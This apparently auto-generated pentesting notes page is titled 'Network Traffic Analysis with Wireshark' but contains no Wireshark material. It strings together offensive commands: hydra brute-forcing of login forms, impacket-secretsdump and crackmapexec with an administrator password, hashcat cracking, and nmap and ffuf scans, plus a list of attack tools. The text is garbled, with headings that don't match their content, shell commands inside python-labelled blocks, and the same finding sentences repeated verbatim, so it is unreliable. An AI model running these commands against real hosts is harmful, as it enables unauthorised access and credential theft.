---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "networking, persistence, privilege escalation, enumeration"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-303.html"
URL_IMAGES: ""
Date: "2025-05-27"
Tags: "Networking, Persistence, Privilege Escalation, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-303"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-303.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Kerberoasting

### POP3

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.177.52 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.180.92/FUZZ
```

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.92.238
nmap -sCV -p27017,143,53 10.11.74.110 -oN scan.txt
nmap -sCV -p3306,1433,110 10.15.35.211 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.135.174/FUZZ
```

- `bloodhound`
- `metasploit`
- `AS-REP Roasting`
- `secretsdump`
- `SQL Injection`

## Python

### SSH

```bash
nmap -sCV -p1521,5985,8443 10.33.199.123 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.172.33/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.23.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.144.178 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.168.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## SMTP

### HTTPS

```python
crackmapexec smb 10.20.33.32 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Laravel

### Remote File Inclusion

```powershell
crackmapexec smb 10.58.28.145 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.143.235 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

- `GetNPUsers`
- `msfvenom`
- `GPP Password`

- `NTLM Relay`
- `ldapsearch`
- `Unquoted Service Path`
- `dcomexec`
- `mimikatz`

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.204.182
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## SSTI

### Cron Job

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
crackmapexec smb 10.95.149.222 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

## Resource-Based Constrained Delegation

### WinRM

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.
